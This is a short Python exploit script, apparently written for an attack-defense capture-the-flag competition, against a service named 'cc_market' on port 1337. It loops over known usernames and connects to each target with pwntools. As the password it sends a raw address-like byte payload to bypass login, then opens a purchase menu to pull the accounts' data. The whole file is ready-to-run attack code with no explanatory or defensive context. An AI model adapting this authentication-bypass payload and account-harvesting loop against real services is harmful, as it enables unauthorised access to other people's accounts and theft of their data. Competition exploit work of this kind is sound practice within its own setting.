#!/usr/bin/env python3
import sys
import os
import sys
sys.path.insert(1, '../imports/')
sys.path.insert(1, 'imports/')

import utils
import requests
import json
from bs4 import BeautifulSoup
from pwn import *

# Use this function to print stuff to client
def log(message):
    print(message, flush=True)

IP_ADDRESS = sys.argv[1]
dir_path = os.path.dirname(os.path.realpath(__file__)) + '/../'
flag_ids = {}
with open(dir_path + 'flag_ids.json', 'r', encoding='utf-8') as f:
    flag_ids = json.loads(f.read())
    #log(flag_ids)

  
# Adjust if needed
headers = { 
    'User-Agent': utils.user_agent(),
    }
data = {
    'email' : utils.email(),
    'username' : utils.username(max=12),
    'password' : utils.password(max=12)
}


# Adjust if needed
SERVICE = "cc_market"
PORT = 1337
TARGET_URL = f'http://{IP_ADDRESS}:{PORT}'

valid_users = flag_ids.get(SERVICE, {}).get(IP_ADDRESS, [])
#print(valid_users)

# print(valid_users)
for user in valid_users:

	#log(IP_ADDRESS)
	p = remote(IP_ADDRESS, 1337)
	#log(IP_ADDRESS)

	p.send(b'2\n')

	p.recvuntil(b'Username: ')

	log(user)
	p.sendline(user.encode())

	p.recvuntil(b'Password: ')

	p.send(b'\xfd\x8c\x04\bm\xc1\x04\b\n')
	log('payload')

	#p.recvuntil(b'===================\n')
	p.recvuntil(b'> ')

	p.send(b'6\n')

	#p.recvuntil(b'.\nYou have 1000 $$$\n')
	log(p.recvuntil(b'do you want to buy?\n'))
